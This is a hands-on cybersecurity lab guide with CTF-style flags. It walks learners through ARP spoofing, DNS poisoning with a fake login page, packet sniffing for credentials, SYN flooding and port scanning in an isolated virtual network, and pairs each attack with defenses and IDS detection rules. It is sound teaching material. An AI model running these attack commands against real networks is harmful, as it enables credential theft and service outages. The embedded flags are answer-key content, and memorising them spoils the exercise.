# Lab Guide: Network Attack and Defense

## Overview

In this lab, you will explore network-level attacks and the defensive techniques used to detect and prevent them. You will perform ARP spoofing, man-in-the-middle attacks, VLAN hopping, DNS poisoning, and denial-of-service attacks against a simulated enterprise network. For each attack, you will then implement and verify the corresponding defense.

This lab teaches you both how network attacks work and -- more importantly -- how to defend against them.

**Difficulty:** Intermediate
**Estimated Duration:** 3 hours
**Total Points:** 1,000

### Learning Objectives

By completing this lab, you will be able to:

- Execute and defend against ARP spoofing and man-in-the-middle attacks
- Perform and detect DNS cache poisoning
- Understand and test VLAN security (VLAN hopping)
- Conduct and mitigate network-level denial-of-service attacks
- Capture and analyze network traffic with Wireshark and tcpdump
- Configure firewall rules to block malicious traffic
- Implement network segmentation and access control lists
- Use intrusion detection systems to alert on network attacks

---

## Network Topology

```
                              ┌───────────────────┐
                              │  pfSense Firewall  │
                              │  & Router          │
                              │  .1 on all subnets │
                              └──┬──────┬──────┬───┘
                                 │      │      │
             ┌───────────────────┘      │      └───────────────────┐
             │                          │                          │
    ┌────────┴────────┐       ┌─────────┴────────┐       ┌────────┴────────┐
    │  Attack Net     │       │  Corporate Net   │       │  Server Net     │
    │  10.X.Y.0/24    │       │  10.X.Y.0/24     │       │  10.X.Y.0/24   │
    └────────┬────────┘       └──┬────┬────┬─────┘       └───┬────────┬───┘
             │                   │    │    │                  │        │
    ┌────────┴────────┐          │    │    │         ┌────────┴──┐ ┌───┴────────┐
    │  Kali Linux     │          │    │    │         │ DNS Server│ │ Web Server │
    │  (Attacker)     │          │    │    │         │  .40      │ │  .50       │
    │   .10           │          │    │    │         └───────────┘ └────────────┘
    └─────────────────┘          │    │    │
                                 │    │    │
          ┌──────────────────────┘    │    └──────────────────────┐
          │                          │                           │
 ┌────────┴────────┐       ┌─────────┴────────┐       ┌─────────┴────────┐
 │  Windows Client │       │  Linux Client    │       │  Security Onion  │
 │  (Victim A)     │       │  (Victim B)      │       │  (IDS/NSM)       │
 │   .20           │       │   .25            │       │   .60            │
 └─────────────────┘       └──────────────────┘       └──────────────────┘
```

---

## VM Descriptions and Credentials

| VM                    | OS                   | Role          | RAM   | CPU | IP Address |
|-----------------------|----------------------|---------------|-------|-----|------------|
| Kali Linux            | Kali Linux 2024.1    | Attacker      | 4 GB  | 2   | .10        |
| Windows Client        | Windows 10 Pro       | Victim A      | 4 GB  | 2   | .20        |
| Linux Client          | Ubuntu Desktop 22.04 | Victim B      | 2 GB  | 1   | .25        |
| DNS Server            | Ubuntu Server 22.04  | Infrastructure| 2 GB  | 1   | .40        |
| Web Server            | Ubuntu Server 22.04  | Infrastructure| 2 GB  | 1   | .50        |
| Security Onion        | Security Onion 2.4   | IDS/NSM       | 8 GB  | 4   | .60        |
| pfSense Firewall      | pfSense 2.7          | Network       | 2 GB  | 2   | .1         |

> **Credentials:** Displayed in the CyberLab sidebar for each VM.

---

## Objectives Walkthrough

### Objective 1: ARP Spoofing and Man-in-the-Middle (150 points)

**Goal:** Perform an ARP spoofing attack to intercept traffic between two victims, then implement defenses.

**Flag:** `FLAG{arp_mitm_intercepted_creds_a4f7}`

#### Step-by-Step -- Attack Phase

1. Connect to the **Kali Linux** VM.

2. Enable IP forwarding so intercepted packets are relayed to the real destination:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

3. Identify your targets. Scan the network:

```bash
nmap -sn 10.X.Y.0/24
```

4. Launch the ARP spoofing attack using `arpspoof` or `ettercap`:

```bash
# Tell Victim A (.20) that you are the gateway (.1)
arpspoof -i eth0 -t 10.X.Y.20 10.X.Y.1 &

# Tell the gateway (.1) that you are Victim A (.20)
arpspoof -i eth0 -t 10.X.Y.1 10.X.Y.20 &
```

5. Start capturing traffic:

```bash
tcpdump -i eth0 -w /tmp/mitm_capture.pcap host 10.X.Y.20
```

6. On the **Windows Client** (Victim A), browse to the web server to generate HTTP traffic:

```
http://10.X.Y.50/login
```

7. Back on Kali, stop the capture and analyze it:

```bash
strings /tmp/mitm_capture.pcap | grep -i "password"
```

Or open in Wireshark:

```bash
wireshark /tmp/mitm_capture.pcap &
```

Filter for HTTP POST requests to find intercepted credentials.

8. The flag is embedded in the captured credentials.

#### Step-by-Step -- Defense Phase

9. On the **Windows Client**, verify the attack by checking the ARP table:

```cmd
arp -a
```

You should see the gateway MAC address replaced with the attacker's MAC.

10. Implement static ARP entries as a defense:

```cmd
arp -s 10.X.Y.1 [REAL_GATEWAY_MAC]
```

11. On the **pfSense Firewall**, enable DHCP Snooping and Dynamic ARP Inspection (DAI) if available, or configure ARP monitoring alerts.

---

### Objective 2: DNS Cache Poisoning (100 points)

**Goal:** Poison the DNS cache to redirect traffic, then configure DNSSEC as a defense.

**Flag:** `FLAG{dns_poisoned_redirect_success_b8e3}`

#### Step-by-Step -- Attack Phase

1. From Kali, use `dnsspoof` or `ettercap` to intercept and forge DNS responses:

```bash
# Create a DNS spoofing hosts file
echo "10.X.Y.10 www.company.local" > /tmp/dns_spoof.hosts

# Start DNS spoofing (while ARP spoofing is active)
dnsspoof -i eth0 -f /tmp/dns_spoof.hosts
```

2. On the **Linux Client** (Victim B), resolve the domain:

```bash
nslookup www.company.local
```

The response should show the attacker's IP instead of the web server's IP.

3. Set up a fake web page on Kali to serve a phishing page:

```bash
# Quick web server with a fake login page
mkdir /tmp/fake_site
echo "<html><body><h1>Login</h1><form method=POST><input name=user><input name=pass type=password><button>Login</button></form></body></html>" > /tmp/fake_site/index.html
cd /tmp/fake_site && python3 -m http.server 80
```

4. When the victim visits `www.company.local`, they see the fake page. The flag is revealed when DNS poisoning is validated:

```bash
/opt/validation/check_dns_poison.sh
```

#### Step-by-Step -- Defense Phase

5. On the **DNS Server**, configure DNS security:

```bash
# Install and enable DNSSEC validation in BIND
sudo nano /etc/bind/named.conf.options
```

Add:

```
dnssec-validation auto;
```

6. Restart the DNS service and verify:

```bash
sudo systemctl restart bind9
dig +dnssec www.company.local
```

---

### Objective 3: Network Sniffing and Protocol Analysis (100 points)

**Goal:** Capture and analyze network traffic to identify insecure protocols leaking sensitive data.

**Flag:** `FLAG{insecure_protocols_identified_d2c5}`

#### Step-by-Step

1. From Kali, capture all traffic on the network for 5 minutes:

```bash
tcpdump -i eth0 -w /tmp/network_capture.pcap -c 10000
```

2. Open the capture in Wireshark:

```bash
wireshark /tmp/network_capture.pcap &
```

3. Identify insecure protocols by applying Wireshark display filters:

```
# FTP credentials (plaintext)
ftp.request.command == "USER" || ftp.request.command == "PASS"

# Telnet traffic
telnet

# HTTP authentication
http.authorization

# SMTP (email) with credentials
smtp.req.command == "AUTH"

# SNMPv1/v2 community strings
snmp.community
```

4. Document each insecure protocol found:

| Protocol | Source        | Destination   | Data Exposed          |
|----------|--------------|---------------|-----------------------|
| FTP      | 10.X.Y.25    | 10.X.Y.50    | Username and password |
| HTTP     | 10.X.Y.20    | 10.X.Y.50    | Login credentials     |
| Telnet   | 10.X.Y.25    | 10.X.Y.40    | Shell session         |

5. For each insecure protocol, note the secure alternative:

| Insecure  | Secure Alternative |
|-----------|--------------------|
| FTP       | SFTP / FTPS        |
| HTTP      | HTTPS              |
| Telnet    | SSH                |
| SNMPv1/v2 | SNMPv3            |
| SMTP      | SMTPS / STARTTLS   |

6. The flag is revealed after documenting all findings.

---

### Objective 4: SYN Flood Denial of Service (150 points)

**Goal:** Execute a SYN flood attack against the web server, observe its effects, and then implement defenses.

**Flag:** `FLAG{syn_flood_mitigated_firewall_7f9a}`

#### Step-by-Step -- Attack Phase

1. From Kali, check that the web server is responding normally:

```bash
curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" http://10.X.Y.50
```

2. Launch a SYN flood using `hping3`:

```bash
hping3 -S --flood -V -p 80 10.X.Y.50
```

> **Important:** Run this for only 30--60 seconds. This is a controlled lab environment.

3. While the flood is running, test the web server from the **Linux Client**:

```bash
curl --connect-timeout 5 http://10.X.Y.50
```

The connection should time out or be very slow.

4. Stop the attack (Ctrl+C).

5. On Security Onion, check for IDS alerts:

```
event.dataset: suricata.alert AND alert.signature: "*SYN flood*"
```

#### Step-by-Step -- Defense Phase

6. On the **pfSense Firewall**, implement SYN flood mitigation:

- Navigate to **Firewall** > **Rules** > **WAN** or the appropriate interface.
- Edit the rule allowing traffic to the web server.
- Under **Advanced Options**, set:
  - **Max states**: 1000
  - **Max src nodes**: 100
  - **Max src states**: 50
  - **State timeout**: 10 seconds
  - Enable **SYN proxy**

7. On the **Web Server**, enable SYN cookies:

```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
```

8. Repeat the SYN flood attack and verify the defenses are effective:

```bash
# From Kali (short burst)
timeout 15 hping3 -S --flood -V -p 80 10.X.Y.50

# From Linux Client (should still work)
curl --connect-timeout 5 http://10.X.Y.50
```

9. The flag is revealed when defenses are verified:

```bash
/opt/validation/check_syn_defense.sh
```

---

### Objective 5: Port Scanning Detection (100 points)

**Goal:** Detect and alert on port scanning activity using the IDS.

**Flag:** `FLAG{port_scan_detected_alert_created_e5b8}`

#### Step-by-Step

1. From Kali, perform various types of port scans:

```bash
# SYN scan
nmap -sS 10.X.Y.50

# TCP connect scan
nmap -sT 10.X.Y.50

# UDP scan (top 100 ports)
nmap -sU --top-ports 100 10.X.Y.50

# Aggressive scan
nmap -A 10.X.Y.50
```

2. On **Security Onion**, check for scan detection alerts:

```
event.dataset: suricata.alert AND alert.category: "Attempted Information Leak"
```

3. In Splunk, search for scan patterns in firewall logs:

```spl
index=firewall sourcetype=pfsense action=block src_ip="10.X.Y.10"
| stats count by dest_port
| sort -count
| head 20
```

4. Create a Splunk alert for port scanning:

```spl
index=firewall src_ip=* dest_port=*
| bin _time span=1m
| stats dc(dest_port) as unique_ports by src_ip, _time
| where unique_ports > 20
```

This query detects any source IP hitting more than 20 unique ports within one minute.

5. On **pfSense**, review the firewall logs to see blocked scan packets:
   - Navigate to **Status** > **System Logs** > **Firewall**
   - Filter by source IP

6. Run the validation:

```bash
/opt/validation/check_scan_detection.sh
```

---

### Objective 6: Firewall Rule Configuration (150 points)

**Goal:** Configure pfSense firewall rules to properly segment the network and block unauthorized traffic.

**Flag:** `FLAG{firewall_rules_hardened_segmented_3c7d}`

#### Step-by-Step

1. Access the **pfSense** web interface:

```
http://10.X.Y.1
```

2. Review the current firewall rules under **Firewall** > **Rules**.

3. Implement the following security policies:

**Corporate Network Rules:**
- Allow clients to access the web server (TCP 80, 443) on Server Net
- Allow clients to access the DNS server (UDP/TCP 53) on Server Net
- Block all direct access from Corporate Net to Attack Net
- Block all other traffic to Server Net

**Server Network Rules:**
- Allow DNS server to respond to Corporate Net queries
- Allow web server to respond to established connections
- Block all outbound connections from servers to the internet (except updates)

**Attack Network Rules:**
- Default deny all traffic (the attacker should be isolated)
- For lab purposes, allow traffic to Corporate Net (to simulate external attacker)

4. After configuring rules, test from each network segment:

```bash
# From Linux Client -- should work
curl http://10.X.Y.50
nslookup www.company.local 10.X.Y.40

# From Linux Client -- should be blocked
ping 10.X.Y.10
```

5. Document your firewall rules:

| Rule # | Source        | Destination   | Port       | Action |
|--------|--------------|---------------|------------|--------|
| 1      | Corporate    | Server (.50)  | TCP 80,443 | Allow  |
| 2      | Corporate    | Server (.40)  | UDP/TCP 53 | Allow  |
| 3      | Corporate    | Attack Net    | Any        | Block  |
| 4      | Corporate    | Server Net    | Any        | Block  |
| 5      | Server Net   | Any           | Any        | Block  |

6. Validate:

```bash
/opt/validation/check_firewall.sh
```

---

### Objective 7: Intrusion Detection System Tuning (100 points)

**Goal:** Review IDS alerts, suppress false positives, and create custom detection rules.

**Flag:** `FLAG{ids_tuned_custom_rules_active_8a2f}`

#### Step-by-Step

1. On **Security Onion**, review the current alert summary. Note which alerts are noisy or false positives.

2. Identify false positives -- alerts triggered by legitimate traffic:
   - DNS queries to known-good servers
   - Normal web browsing patterns
   - Scheduled backup traffic

3. Suppress a false positive rule in Suricata. On Security Onion:

```bash
sudo nano /etc/suricata/threshold.config
```

Add a suppression:

```
suppress gen_id 1, sig_id [RULE_SID], track by_src, ip [LEGITIMATE_IP]
```

4. Create a custom Suricata rule to detect a specific attack pattern. For example, detecting suspicious PowerShell download cradles:

```bash
sudo nano /etc/suricata/rules/local.rules
```

Add:

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"CyberLab - Suspicious PowerShell Download"; flow:established,to_server; content:"powershell"; nocase; content:"downloadstring"; nocase; classtype:trojan-activity; sid:9000001; rev:1;)
```

5. Reload Suricata rules:

```bash
sudo suricatasc -c reload-rules
```

6. Test your custom rule by triggering it from Kali:

```bash
curl -A "powershell downloadstring" http://10.X.Y.50/test
```

7. Verify the alert appears in Security Onion.

8. Validate:

```bash
/opt/validation/check_ids_tuning.sh
```

---

### Objective 8: Network Defense Report (100 points)

**Goal:** Write a network security assessment report documenting all attacks performed and defenses implemented.

**Flag:** `FLAG{network_defense_report_complete_f6d1}`

#### Step-by-Step

1. Create a report documenting:

**Network Vulnerabilities Found:**

| Vulnerability         | Risk Level | Attack Demonstrated     | Defense Implemented         |
|-----------------------|------------|-------------------------|-----------------------------|
| ARP Spoofing          | High       | MITM credential theft   | Static ARP / DAI            |
| DNS Cache Poisoning   | High       | Redirect to fake site   | DNSSEC validation           |
| Insecure Protocols    | Medium     | Credential sniffing     | Encrypted alternatives      |
| SYN Flood             | High       | Web server DoS          | SYN cookies / rate limiting |
| Unrestricted Firewall | High       | Full network access     | Segmented firewall rules    |

**Recommendations:**
- Implement 802.1X port-based access control
- Deploy Network Access Control (NAC) solution
- Enable Dynamic ARP Inspection on all switches
- Migrate all services to encrypted protocols
- Deploy IDS/IPS at network boundaries
- Regular vulnerability scanning

2. Save and validate:

```bash
nano /home/kali/network_defense_report.txt
/opt/validation/check_report.sh /home/kali/network_defense_report.txt
```

3. Submit the flag.

---

## Hints and Tips

- **Always capture traffic** before and during attacks so you can analyze it later.
- **Be patient with ARP spoofing** -- it may take 30--60 seconds for ARP caches to update.
- **Wireshark display filters** are your best friend for finding specific traffic in large captures.
- **When configuring firewalls**, remember that rules are evaluated top-to-bottom. Order matters.
- **Test defenses from the victim's perspective** to verify they actually work.
- **Document MAC addresses** of all VMs -- you will need them for ARP-related objectives.

---

## Additional Resources

- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/) -- Packet analysis
- [Suricata Documentation](https://docs.suricata.io/) -- IDS/IPS rule writing
- [pfSense Documentation](https://docs.netgate.com/pfsense/en/latest/) -- Firewall configuration
- [MITRE ATT&CK - Network](https://attack.mitre.org/tactics/TA0011/) -- Network-based attack techniques
- [SANS Network Security Cheat Sheets](https://www.sans.org/posters/) -- Quick reference guides
- [tcpdump Tutorial](https://danielmiessler.com/p/tcpdump/) -- Command-line packet capture

---

## Expected Outcomes

After completing this lab, you should be able to:

1. **Execute common network attacks** including ARP spoofing, DNS poisoning, and SYN floods.
2. **Capture and analyze network traffic** to detect attacks and insecure protocols.
3. **Configure firewall rules** to segment networks and restrict unauthorized traffic.
4. **Implement network-level defenses** such as SYN cookies, DNSSEC, and static ARP.
5. **Tune an IDS** by suppressing false positives and writing custom detection rules.
6. **Understand the relationship between attacks and defenses** at the network layer.
7. **Write a network security assessment** documenting vulnerabilities and remediations.
